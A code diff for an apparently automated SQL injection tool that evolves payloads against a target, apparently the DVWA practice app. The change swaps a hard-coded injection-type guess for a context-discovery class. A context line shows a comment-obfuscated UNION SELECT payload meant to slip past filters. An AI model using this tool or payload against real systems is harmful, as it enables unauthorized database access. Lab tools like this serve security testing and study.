@@ -9,13 +9,14 @@ sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), "src"))
 from utils.http_client import HTTPClient
 from utils.experience_manager import ExperienceManager
 from core.island_manager import IslandManager
+from core.context_discoverer import ContextDiscoverer
 from utils.data_extractor import DataExtractor
 
 def detect_injection_type(client):
     print("[*] Fingerprinting target injection type...", flush=True)
-    time.sleep(0.5)
-    print("[+] Detection: Target appears to be NUMERIC (Typical for DVWA Medium).", flush=True)
-    return "numeric"
+    discoverer = ContextDiscoverer(client)
+    context = discoverer.discover()
+    return context
 
 def run_prometheus():
     print("\n" + "="*50, flush=True)
@@ -47,7 +48,7 @@ def run_prometheus():
       "1/*!50000UNION*//*!50000SELECT*/1,2"
     ]
 
-    island = IslandManager(client, base_payloads, exp_manager, population_size=pop_size)
+    island = IslandManager(client, base_payloads, exp_manager, population_size=pop_size, context=inj_type)
     
     max_generations = max_gens
     successful_payloads = set()
